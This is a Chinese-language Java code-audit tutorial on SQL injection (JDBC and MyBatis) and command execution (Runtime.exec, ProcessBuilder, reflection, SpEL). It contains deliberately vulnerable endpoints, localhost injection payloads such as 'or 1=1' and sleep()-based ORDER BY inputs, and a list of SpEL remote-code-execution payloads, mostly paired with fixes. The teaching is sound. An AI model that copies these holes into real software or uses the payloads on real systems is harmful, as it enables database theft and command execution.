# java代码审计
## 一、sql注入
1、通过一些关键字可以定位到SQL语句附近

```java
Statement
createStatement
PrepareStatement
like '%${
in (${
select
update
insert
```

### （一）、JDBC的SQL注入
#### 1、常规漏洞
实操--搭建springboot

<img width="794" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/b09b9e0e-6afc-4ed4-aefd-154174bdbd60">
<img width="791" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/4f252ca1-3b58-439c-84c5-0085a45465fd">

配置数据库

<img width="795" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/c691650a-2816-44a6-8688-56ffe18f4b5f">

打开 src/main/resources/application.properties 配置文件，将以下数据库连接信息添加至配置中

```
#访问端口号
server.port=7070
#数据库连接信息
spring.datasource.url=jdbc:mysql://localhost:3306/java_sec-code?AllowPublicKeyRetrieval=true&useSSL=false&serverTimezone=UTC
spring.datasource.username=root
spring.datasource.password=root
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
```
<img width="1400" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/e8424abe-a179-4fcf-9d3a-2bf87917cc40">

在 src\main\java\com\example\demo\jdbcinjection 下新建一个名为 JdbcDynamicController 的 Java Class。
```
package com.example.sql.jdbc;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.sql.*;

@RestController
@RequestMapping("/jdbcsql")
public class JdbcDynamicController {
    private static String driver = "com.mysql.cj.jdbc.Driver";
    //使用的是MySQL数据库的JDBC驱动，其类名是 "com.mysql.cj.jdbc.Driver"。这个驱动类负责与MySQL数据库建立连接。
    //用于从配置文件中读取属性值
    @Value("${spring.datasource.url}")
    private String url;
    @Value("${spring.datasource.username}")
    private String user_name;
    @Value("${spring.datasource.password}")
    private String password;

    @RequestMapping("/dynamic")
    public String jdbcdynamic(@RequestParam("id") String id) throws ClassNotFoundException, SQLException {
        StringBuilder result = new StringBuilder();
        Class.forName(driver);
        Connection conn = DriverManager.getConnection(url, user_name, password);
        Statement statement = conn.createStatement();
        String sql = "select * from user where user_id = '" + id + "'";
        ResultSet rs = statement.executeQuery(sql);
        //遍历结果集
        while (rs.next()) {
            String rsUsername = rs.getString("user_name");
            String rsPassword = rs.getString("password");
            String info = String.format("%s: %s\n", rsUsername, rsPassword);
            result.append(info);
        }
        rs.close();
        conn.close();
        return result.toString();



    }
}
```

<img width="794" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/2b29dedf-a768-49d0-b1ff-d69c853af360">

测试      
```
http://127.0.0.1:7070/jdbcsql/dynamic?id=3
```

<img width="686" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/b575cb82-e798-41b8-b6b9-90ecf08ce4a7">
<img width="688" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/226677b2-447b-4336-ae04-3337c3ddde22">

漏洞修复

在 src\main\java\com\example\demo\jdbcinjection 下新建一个名为 JdbcPrepareStatement 的 Java Class

```java
package com.example.sql.jdbc;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.sql.*;

@RestController
@RequestMapping("/jdbcsqld")
public class JdbcPrepareStatement {
    private static String driver = "com.mysql.cj.jdbc.Driver";
    @Value("${spring.datasource.url}")
    private String url;
    @Value("${spring.datasource.username}")
    private String user_name;
    @Value("${spring.datasource.password}")
    private String password;

    @RequestMapping("/preSec")

    public String jdbcPreSec(@RequestParam("id") String id) throws ClassNotFoundException, SQLException {
        if (id == null || id.trim().isEmpty()) {
            return "Invalid id";
        }

        StringBuilder result = new StringBuilder();
        try {
            Class.forName(driver);
            Connection conn = DriverManager.getConnection(url, user_name, password);
            String sql = "select * from user where user_id=?";
            PreparedStatement preparedStatement = conn.prepareStatement(sql);
            preparedStatement.setString(1, id);

            ResultSet rs = preparedStatement.executeQuery();
            while (rs.next()) {
                String resUsername = rs.getString("user_name");
                String resPassword = rs.getString("password");
                String info = String.format("%s: %s\n", resUsername, resPassword);
                result.append(info);
            }
        } catch (Exception e) {
            // Log or handle the exception here
            return "Error occurred: " + e.getMessage();
        }

        return result.toString();
    }

    @RequestMapping("/preNot")
    public String jdbcPreNot(@RequestParam("id") String id) throws SQLException, ClassNotFoundException {
        StringBuilder result = new StringBuilder();
        Class.forName(driver);
        Connection conn = DriverManager.getConnection(url, user_name, password);
        //还是直接进行了拼接 无效
        String sql = "select * from user where user_id = '" + id + "'";
        PreparedStatement preparestatement = conn.prepareStatement(sql);
        ResultSet rs = preparestatement.executeQuery();
        while (rs.next()) {
            String reUsername = rs.getString("user_name");
            String resPassword = rs.getString("password");
            String info = String.format("%s: %s\n", reUsername, resPassword);
            result.append(info);
        }
        rs.close();
        conn.close();
        return result.toString();

    }

}

```

正确的预编译代码效果：

```
http://127.0.0.1:7070/jdbcsqld/preNot?id=1%27or%201=1%23
```
<img width="841" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/1adf73a9-82ef-475f-945c-5d370d10641b">

错误的预编译代码效果：

```
http://127.0.0.1:7070/jdbcsqld/preSec?id=1%27or%201=1%23
```

<img width="808" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/2daf76ad-c596-4da2-a0c1-4079eead2ccd">

#### 2、order by注入

order by 语句用于对结果集进行排序。 order by 语句后面需要是字段名或者字段位 置。 在使用 PreparedStatement 预编译时，会将传递任意参数使用单引号包裹进而变为了字符串。 如果使用预编译方式执行 order by 语句，设置的字段名会被人为是字符串，而不再是字段名。 因此，在使用 order by 时，就不能使用 PreparedStatement 预编译了

新建一个名为 jdbcOrderby 的Java Class， 并键入以下代码

```java
package com.example.sql.jdbc;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.sql.*;

@RestController
@RequestMapping("/jdbcsqlorderby")
public class jdbcOrderby {
    private static String driver = "com.mysql.jdbc.Driver";
    @Value("${spring.datasource.url}")
    private String url;
    @Value("${spring.datasource.username}")
    private String user_name;
    @Value("${spring.datasource.password}")
    private String password;
    @RequestMapping("/PreOrderby")
    public String jdbcOrderby(@RequestParam("id") String id) throws
            ClassNotFoundException, SQLException {
        StringBuilder result = new StringBuilder();
        Class.forName(driver);
        Connection conn = DriverManager.getConnection(url, user_name, password);
        String sql = "select * from user" + " order by " + id;
        PreparedStatement preparestatement = conn.prepareStatement(sql);
        ResultSet rs = preparestatement.executeQuery();
        while (rs.next()) {
            String reUsername = rs.getString("user_name");
            String resPassword = rs.getString("password");
            String info = String.format("%s: %s\n", reUsername, resPassword);
            result.append(info);
        }
        rs.close();
        conn.close();
        return result.toString();
    }
}

```
测试

```
http://127.0.0.1:7070/jdbcsqlorderby/PreOrderby?id=if(1=1,sleep(1),1)
```

<img width="919" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/35143a1d-2169-44d8-8697-c519b8f07720">

漏洞修复

```java
package com.example.sql.jdbc;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import java.sql.*;

@RestController
@RequestMapping("/jdbcsqlorderbysec")
public class jdbcOrderbysec {
    private static String driver = "com.mysql.jdbc.Driver";
    @Value("${spring.datasource.url}")
    private String url;
    @Value("${spring.datasource.username}")
    private String user_name;
    @Value("${spring.datasource.password}")
    private String password;

    @RequestMapping("/PreOrderbysec")
    public String jdbcOrderby(@RequestParam("id") String id) {
        StringBuilder result = new StringBuilder();
        String sql = "select * from user order by ?";

        try (Connection conn = DriverManager.getConnection(url, user_name, password);
             PreparedStatement preparestatement = conn.prepareStatement(sql)) {

            preparestatement.setString(1, id);
            ResultSet rs = preparestatement.executeQuery();

            while (rs.next()) {
                String reUsername = rs.getString("user_name");
                String resPassword = rs.getString("password");
                String info = String.format("%s: %s\n", reUsername, resPassword);
                result.append(info);
            }

        } catch (SQLException e) {
            e.printStackTrace(); // or log the exception
            // Handle the SQL exception appropriately
            return "Error occurred: " + e.getMessage();
        }

        return result.toString();
    }
}


```

使用 `PreparedStatement`来安全地处理参数

<img width="870" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/dbafb023-b190-48a4-a44c-53f1afd7d038">

#### 3、like注入

```java
package com.example.sql.jdbc;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.RestController;
import java.sql.*;

@RestController
@RequestMapping("/jdbcsqllike")
public class jdbcsqllike {
    private static String driver = "com.mysql.jdbc.Driver";
    @Value("${spring.datasource.url}")
    private String url;
    @Value("${spring.datasource.username}")
    private String user_name;
    @Value("${spring.datasource.password}")
    private String password;

    @RequestMapping("/vul")
    public String jdbclike(@RequestParam("id") String id) throws ClassNotFoundException, SQLException {
        StringBuilder result = new StringBuilder();
        Class.forName(driver);
        Connection conn = DriverManager.getConnection(url, user_name, password);

        // Vulnerable code using concatenated string
        String sql = "SELECT * FROM user WHERE user_name LIKE '%" + id + "%'";

        PreparedStatement preparestatement = conn.prepareStatement(sql);
        ResultSet rs = preparestatement.executeQuery();

        while (rs.next()) {
            String reUsername = rs.getString("user_name");
            String resPassword = rs.getString("password");
            String info = String.format("%s: %s\n", reUsername, resPassword);
            result.append(info);
        }

        rs.close();
        conn.close();
        return result.toString();
    }
}

```

测试

```
http://127.0.0.1:7070/jdbcsqllike/vul?id=d
```

<img width="726" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/d24baf30-e04d-4d14-ade9-de323ad287f9">


```
http://127.0.0.1:7070/jdbcsqllike/vul?id=a
```

<img width="634" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/96961ac0-33c9-4aa2-a968-7cb6ef3c0946">

漏洞修复
```
package com.example.sql.jdbc;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.RestController;
import java.sql.*;

@RestController
@RequestMapping("/jdbcsqllikesec")
public class jdbcsqllikesec {
    private static String driver = "com.mysql.jdbc.Driver";
    @Value("${spring.datasource.url}")
    private String url;
    @Value("${spring.datasource.username}")
    private String user_name;
    @Value("${spring.datasource.password}")
    private String password;

    @RequestMapping("/secure")
    public String jdbclikeSecure(@RequestParam("id") String id) {
        StringBuilder result = new StringBuilder();

        try (Connection conn = DriverManager.getConnection(url, user_name, password)) {
            // Secure code using parameterized query
            String sql = "SELECT * FROM users WHERE user_name LIKE ?";
            try (PreparedStatement preparestatement = conn.prepareStatement(sql)) {
                preparestatement.setString(1, "%" + id + "%");
                ResultSet rs = preparestatement.executeQuery();

                while (rs.next()) {
                    String reUsername = rs.getString("user_name");
                    String resPassword = rs.getString("password");
                    String info = String.format("%s: %s\n", reUsername, resPassword);
                    result.append(info);
                }
            }
        } catch (SQLException e) {
            e.printStackTrace(); // Log or handle the exception appropriately
            return "Error occurred: " + e.getMessage();
        }

        return result.toString();
    }
}

```
```
http://127.0.0.1:7070/jdbcsqllikesec/secure?id=a
```
<img width="585" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/71910765-686e-458d-ba4d-bf5aaab36fd5">


### （二）、Mybatis的SQL注入

MyBatis 是一款优秀的持久层框架，它支持自定义 SQL、存储过程以及高级映射。MyBatis 免除了几乎 所有的 JDBC 代码以及设置参数和获取结果集的工作。MyBatis 可以通过简单的 XML 或注解来配置和映 射原始类型、接口和 Java POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。

在Mybatis中拼接SQL语句有两种方式：一种是占位符 #{} ，另一种是拼接符 ${} 。

 占位符 #{} ：对传入的参数进行预编译转义处理。类似JDBC中的 PreparedStatement 。 

拼接符 ${} ：对传入的参数不做处理，直接拼接，进而会造成SQL注入漏洞。

 #{} 可以有效防止SQL注入漏洞。 ${} 则无法防止SQL注入漏洞。 因此在我们对JavaWeb整合Mybatis系统进行代码审计时，应着重审计SQL语句拼接的地方。 除非开发人员的粗心对拼接语句使用了 ${} 方式造成的SQL注入漏洞。 

**在Mybatis中有几种场景是不能使用预编译方式的，比如： order by 、 in ， like 。**

#### 1、${}和\#{}

在MyBatis中，`${}`和`#{}`都用于在SQL语句中进行参数替换，但它们的工作方式不同，对于SQL注入有不同的影响。

1. **`${}`（字符串替换）:**

   - 在MyBatis中，`${}`用于简单的字符串替换。参数的值直接插入到SQL语句中，没有额外的处理。
   - 如果输入没有得到适当的验证或清理，这可能导致SQL注入。

   ```xml
   <!-- 使用 ${} 的示例 -->
   <select id="getUserById" resultType="User">
       SELECT * FROM users WHERE id = ${userId}
   </select>
   ```

   如果 `userId` 没有得到适当的验证，攻击者可以提供一个值来修改查询，从而导致SQL注入。

   ```java
   // Java代码中的使用示例
   Map<String, Object> paramMap = new HashMap<>();
   paramMap.put("userId", "1 OR 1=1");
   User user = sqlSession.selectOne("getUserById", paramMap);
   ```

   在这个例子中，如果 `userId` 没有得到适当的验证，它可能导致SQL注入，查询变为 `SELECT * FROM users WHERE id = 1 OR 1=1`，这将总是返回结果。

   

2. **`#{}`（预处理语句）:**

   - 在MyBatis中，`#{}`用于预处理语句中的参数替换。MyBatis会处理值，确保它们被适当地转义和清理。
   - `#{}`比`${}`更安全，有助于防止SQL注入。

   ```xml
   <!-- 使用 #{} 的示例 -->
   <select id="getUserById" resultType="User">
       SELECT * FROM users WHERE id = #{userId}
   </select>
   ```

   ```java
   // Java代码中的使用示例
   Map<String, Object> paramMap = new HashMap<>();
   paramMap.put("userId", "1 OR 1=1");
   User user = sqlSession.selectOne("getUserById", paramMap);
   ```

   在这种情况下，MyBatis将以一种防止SQL注入的方式处理参数替换，生成的查询将是 `SELECT * FROM users WHERE id = ?`。

**总结:**

- 尽可能使用 `#{}` 进行参数替换，以防止SQL注入。MyBatis会处理这些值，确保它们被适当地转义。
- 避免使用 `${}`，除非你确信输入已经得到适当的验证和清理，因为它会直接替换值到SQL语句中。

在使用用户输入时，请谨慎对待并在将其用于SQL语句之前验证/清理它们，以防止安全漏洞，如SQL注入。

mybatis中有些地方不能使用预编译的，这种场景下就容易出现sql注入漏洞：
```
动态 SQL 中的表名、列名：如果在动态 SQL 中使用 ${} 来表示表名、列名等标识符，因为这些标识符是在 SQL 解析阶段确定的，无法使用预编译参数来替换。
动态 SQL 中的 SQL 语句片段：例如在 <sql> 或 <selectKey> 等元素中使用 ${}，这些片段是在 SQL 解析阶段确定的，也无法使用预编译参数来替换。
动态 SQL 中的 ORDER BY 字段：如果在 ORDER BY 子句中使用 ${} 来表示排序字段，因为排序字段是在 SQL 解析阶段确定的，同样无法使用预编译参数来替换。
LIKE 操作中的模糊查询字符串：如果在 LIKE 操作中使用 ${} 来表示模糊查询的字符串，因为这个字符串是直接拼接到 SQL 语句中的，不会被预编译。
```
#### 2、orderby 注入
在 MyBatis 中，Order By 注入是一种常见的 SQL 注入攻击类型。这种攻击通常发生在使用动态 SQL 语句时，特别是当使用字符串拼接来构建 Order By 子句时。为了防止 Order By 注入，我们通常建议使用 `#{}` 来处理动态参数。

假设有一个 MyBatis 映射文件，其中有一个动态 SQL 语句用于构建 Order By 子句：

```java
// 由于使用#{}会将对象转成字符串，形成order by "user" desc造成错误，因此很多研发会采用${}来解决，从而造成SQL注入

@GetMapping("/vul/order")
public List<User> orderBy(String field, String sort) {
    return userMapper.orderBy(field, sort);
}

// xml方式
<select id="orderBy" resultType="com.best.hello.entity.User">
    select * from users order by ${field} ${sort}
</select>

// 注解方式
@Select("select * from users order by ${field} desc")
List<User> orderBy2(@Param("field") String field);
             
```

漏洞修复- 排序映射

```
<select id="orderBySafe" resultType="com.best.hello.entity.User">
    select * from users
    <choose>
        <when test="field == 'id'">
            order by id desc
        </when>
        <when test="field == 'user'">
            order by user desc
        </when>
        <otherwise>
            order by id desc
        </otherwise>
    </choose>
</select>
```

#### 3、like注入
```
<select id="list" resultType="com.itheima.pojo.Emp">
	select *
	from emp
	<where>
		<if test="name!=null and name!=''">
			name like '% $iname} %'

		</if>
		<if test="gender!=null">
			gender = #{gender}
		</if>
		<if test="begin!=null and end!=null">
			entrydate between #{begin} and #{end}
		</if>
	</where>
	order by update_time desc
</select>
```
安全写法：使用concat将%%与预编译组合起来。
```
<select id="list" resultType="com.itheima.pojo.Emp">
	select *
	from emp
	<where>
		<if test="name!=null and name!=''">

			name like concat('%',#{name},'%')
		</if>
		<if test="gender!=null">
			gender = #{gender}
		</if>
		<if test="begin!=null and end!=null">
			entrydate between #{begin} and #{end}
		</if>
	</where>
	order by update _time desc
</select>
```
## 二、命令执行

1、通过一些关键字可以定位到

```java
一、java命令执行函数
runtime
processBuilder
ScriptEngineManager
yaml
groovy
二、SPEL表达式  （使用SimpleEvaluationContext修复）
SpelExpressionParser （解析SpEL表达式的类）
StandardEvaluationContext（SpEL的EvaluationContext实现默认）
```

### （一）、java命令执行函数

####  1、runtime/exec

在 Java 代码审计中，`Runtime.exec()` 或 `ProcessBuilder` 的使用可能存在命令执行漏洞。这种漏洞通常发生在开发者接受用户输入并将其直接传递给这些执行外部命令的函数时，而未经过充分的验证和过滤。攻击者可以通过精心构造的输入来执行恶意命令，从而导致安全问题。

漏洞代码1

```java
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class VulnerableCode {

    public void executeCommand(String userInput) {
        try {
            String command = "echo " + userInput;
            Process process = Runtime.getRuntime().exec(command);
//使用Java的Runtime类执行用户输入的命令，并返回一个Process对象。
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
          //创建一个BufferedReader对象reader，用于读取从Process对象返回的输入流。
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            process.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        VulnerableCode vulnerableCode = new VulnerableCode();
        String userInput = "Hello, World!"; // 用户输入，未经验证
        vulnerableCode.executeCommand(userInput);
    }
}

```

漏洞代码2

```java
package com.example.demo;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

@WebServlet("/rce1")//这是一个Servlet的注解
public class rce1Servlet extends HttpServlet {
  //定义一个名为rce1Servlet的类，它继承了HttpServlet类
    @Override//覆盖
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        req.setCharacterEncoding("utf-8");
        resp.setCharacterEncoding("utf-8");
        resp.setContentType("text/html; charset=utf-8");
        String cmd = req.getParameter("cmd");
        StringBuffer sb = new StringBuffer();
      //创建一个StringBuffer对象，用于存储命令的输出结果。
        BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
        String line;
        while ((line=br.readLine())!=null){
            sb.append(line).append("</br>");
        }
      // 将读取到的每一行内容添加到StringBuffer中，并在每一行后面添加一个换行符。
        br.close();
        resp.getWriter().write(sb.toString());
    }
}


```

漏洞触发

```
http://localhost:8080/rce1?cmd=calc
```

追踪三个函数的关系,直接跟进exec函数，一直“ctrl+点击exec”函数，最终可以跟到，是调用的ProcessBuilder类的start函数

<img width="926" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/37e53411-6ab3-4d9a-9135-f9a948ed367a">


继续跟进start函数，看到调用的是ProcessImpl.start

<img width="1009" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/ddc7eb29-9871-4c09-83d8-2d89da7a230d">


#### 2、processBuilder

对于 `ProcessBuilder`，攻击者可能会通过在命令或参数中插入特殊字符来尝试执行恶意命令。

下面是一个展示漏洞的简单示例：

```java
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class VulnerableProcessBuilder {

    public void executeCommand(String userInput) {
        try {
            ProcessBuilder processBuilder = new ProcessBuilder("echo", userInput);
            //创建一个ProcessBuilder对象， 
            Process process = processBuilder.start();
            //使用ProcessBuilder启动一个新的进程
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
          //// 创建一个BufferedReader对象来读取进程的输出  
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            process.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        VulnerableProcessBuilder vulnerableProcessBuilder = new VulnerableProcessBuilder();
        String userInput = "Hello, World!"; // 用户输入，未经验证
        vulnerableProcessBuilder.executeCommand(userInput);
    }
}

```

漏洞案例2

```
package com.example.demo;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

@WebServlet("/rce2")
public class rce2Servlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        req.setCharacterEncoding("utf-8");
        resp.setCharacterEncoding("utf-8");
        resp.setContentType("text/html; charset=utf-8");
        String cmd = req.getParameter("cmd");
        String[] arrcmd={"cmd.exe","/c",cmd};
      //创建一个字符串数组"arrcmd"，其中包含三个元素
        StringBuffer sb = new StringBuffer();
      //创建一个StringBuffer对象，用于构建响应的HTML文本
        ProcessBuilder processBuilder= new ProcessBuilder(arrcmd);
        Process process = processBuilder.start();
        BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        while ((line=br.readLine())!=null){
            sb.append(line).append("</br>");
        }
        br.close();
        resp.getWriter().write(sb.toString());
    }
}
```
#### 3、ProcessImpl

```
ProcessImpl类通常是为ProcessBuilder.start()创建新进程服务的，不能直接去调用。

看到ProcessImpl类构造器私有，所以不能直接对其进行实例化，为了演示可以用反射进行调用。

在获取到一个静态方法后，必须用setAccessible修改它的作用域，否则不能调用。 

```

```java
public class Demo {
    public static void main(String[] args){
        try {
            String[] cmds = {"calc"};
            Class clazz = Class.forName("java.lang.ProcessImpl");
          //使用Java的反射API获取名为"java.lang.ProcessImpl"的类的Class对象。这个类是Java的内置类，用于处理进程。
            Method method = clazz.getDeclaredMethod("start",
                    new String[]{}.getClass(),
                    Map.class,String.class,
                    ProcessBuilder.Redirect[].class,
                    boolean.class);
//在ProcessImpl类中获取一个名为"start"的方法，这个方法需要六个参数：一个String数组、一个Map对象、一个String对象、一个ProcessBuilder.Redirect数组、一个boolean对象。这些参数的类型都是通过类或接口名指定的。
            method.setAccessible(true);//设置方法为可访问，即使它是私有的。
            method.invoke(null,cmds,null,".",null,true);
//调用上面获取的方法，传入的参数分别是null、上面定义的命令数组、null、当前目录".", null和true。这行代码试图启动一个名为"calc"的命令，并在当前目录执行。
          
        } catch (Exception e) {
            System.out.println(e.toString());
        }
    }
}
```

**知识扩展**

调用`Runtime#exec()`来执行`calc`和`ipconfig`命令：Runtime.getRuntime().exec(command)

```java
import java.lang.reflect.Method;

public class ExecExample {
    public static void main(String[] args) {
        try {
            // 获取 Runtime 类的 Class 对象
            Class<?> clazz = Class.forName("java.lang.Runtime");

            // 获取 Runtime.getRuntime() 方法
            Method getRuntimeMethod = clazz.getMethod("getRuntime");

            // 调用 Runtime.getRuntime() 方法，获取 Runtime 实例
            Object runtime = getRuntimeMethod.invoke(null);
						//getRuntimeMethod是通过引用获取Runtime类的getRuntime方法。invoke(null)是调用该方法，并传递null作为调用者对象，因为getRuntime方法是静态方法，不需要实例即可调用。
          
            // 获取 exec 方法
            Method execMethod = clazz.getMethod("exec", String.class);
						//String.class是用于指定exec方法的参数类型，即要执行的系统命令
          
            // 执行 calc 命令
            execMethod.invoke(runtime, "calc");

            // 执行 ipconfig 命令
            execMethod.invoke(runtime, "ipconfig");
        } catch (Exception e) {
            System.out.println(e.toString());
        }
    }
}

```

漏洞修复

利用SecurityUtil.cmdfilter对传入的参数进行过滤，严格限制用户只能输入a-zA-Z0-9_-.字符

````java
public class SecurityUtil {
    public static String cmdfilter(String input) {
        // 使用正则表达式过滤，只允许a-zA-Z0-9-_字符和.
        return input.replaceAll("[^a-zA-Z0-9_\\-.]", "");
    }
}

@RestController
@RequestMapping("/rce")
public class RceController {

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        // 使用cmdfilter对用户输入进行过滤
        String filteredCmd = SecurityUtil.cmdfilter(cmd);

        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        try {
            Process p = run.exec(filteredCmd);
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return e.toString();
        }
        return sb.toString();
    }
}
````

### （二）、SpEL表达式

Spring Expression Language（SpEL）是在Spring框架中引入的一种表达式语言，用于在运行时执行查询和操作对象图。SpEL支持在运行时查询和操作对象图，它可以用于各种用途，包括查询对象属性、调用对象方法、计算表达式等。

SpEL的用法有三种形式

```
一种是在注解@Value中；

一种是XML配置；

一种是在代码块中使用Expression。

各种Spring CVE漏洞都是基于Expression形式的SpEL表达式注入

```

以下是SpEL的一些基本特性和用法：

1. 基本语法

SpEL表达式使用`${}`作为定界符，可以嵌套使用。例如：

```java
// 字符串拼接
String expression = "Hello, #{'World' + '!'}. Today is #{T(java.time.LocalDate).now()}";
```

2. 访问属性

通过`.`操作符，可以访问对象的属性：

```java
// 访问对象属性
String expression = "person.name";
```

3. 调用方法

通过`()`操作符，可以调用对象的方法：

```java
// 调用对象方法
String expression = "person.sayHello()";
```

4. 字面值

支持字符串、数字、布尔值等字面值：

```java
// 字符串字面值
String expression = "'Hello, World!'";
// 数字字面值
String expression = "42";
// 布尔字面值
String expression = "true";
```

5. 集合操作

SpEL支持对集合的操作，例如访问列表元素、映射的键值对等：

```java
// 访问列表元素
String expression = "myList[0]";
// 访问映射的键值对
String expression = "myMap['key']";
```

6. 运算符

SpEL支持常见的运算符，如算术运算符、关系运算符、逻辑运算符等：

```java
// 算术运算
String expression = "5 + 2";
// 关系运算
String expression = "age > 18";
// 逻辑运算
String expression = "isMember and hasRole('ROLE_ADMIN')";
```

7. 类型

可以使用`T()`关键字获取Java类的静态方法或字段：

```java
// 获取当前日期
String expression = "T(java.time.LocalDate).now()";
```

8. 条件表达式

SpEL支持三元条件表达式：

```java
// 三元条件表达式
String expression = "isMember ? 'Member' : 'Not a Member'";
```

9. 正则表达式

SpEL支持对字符串进行正则表达式匹配：

```java
// 正则表达式匹配
String expression = "'hello123' matches '[a-z]+\\d+'";
```

10. 安全导航操作符

通过`?.`操作符，可以避免在访问可能为`null`的对象时抛出空指针异常：

```java
// 安全导航操作符
String expression = "person?.address?.city";
```



漏洞代码

```java
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class VulnerableSpelExample {

    public static void main(String[] args) {
        // 恶意的SPEL表达式，攻击者可以传入的数据
        String userInput = "${T(java.lang.Runtime).getRuntime().exec('calc.exe')}";

        // 创建一个SPEL表达式解析器
        ExpressionParser parser = new SpelExpressionParser();

        // 解析用户输入的SPEL表达式
        Expression expression = parser.parseExpression(userInput);

        // 评估表达式并执行
        Object result = expression.getValue();

        System.out.println("Result: " + result);
    }
}

```

漏洞修复

SimpleEvaluationContext 旨在仅支持 SpEL 语言语法的一个子集。它不包括 Java 类型引用，构造函数和 bean 引用；所以最直接的修复方式是使用 SimpleEvaluationContext 替换StandardEvaluationContext

```java
import org.springframework.expression.EvaluationContext;
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.SimpleEvaluationContext;

public class SecureSpelExample {

    public static void main(String[] args) {
        // 恶意的SPEL表达式，攻击者可以传入的数据
        String userInput = "${T(java.lang.Runtime).getRuntime().exec('calc.exe')}";

         // 使用 SimpleEvaluationContext 创建 ExpressionParser
        ExpressionParser parser = new SpelExpressionParser();
        SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();

        // 使用 ExpressionParser 解析用户输入，并在受限上下文中评估它
        try {
            Expression expression = parser.parseExpression(userInput);
            Object result = expression.getValue(context);
            System.out.println("Result: " + result);
        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }
    }
}

```

其他

```java
、、正常无回显
T(java.lang.Runtime).getRuntime().exec("calc")
new java.lang.ProcessBuilder("calc").start()

、、正常有回显
new java.util.Scanner(new java.lang.ProcessBuilder("cmd", "/c", "ipconfig /all").start().getInputStream(), "GBK").useDelimiter("asfsfsdfsf").next()


、、模板的无回显，就将上面的payload放到“ #{} ”
#{T(java.lang.Runtime).getRuntime().exec("calc")}
#{new java.lang.ProcessBuilder("calc").start()}

、、模板有回显，就将上面的payload放到“ #{} ”
#{new java.util.Scanner(new java.lang.ProcessBuilder("cmd", "/c", "ipconfig /all").start().getInputStream(), "GBK").useDelimiter("asfsfsdfsf").next()}

```

## 三、文件上传

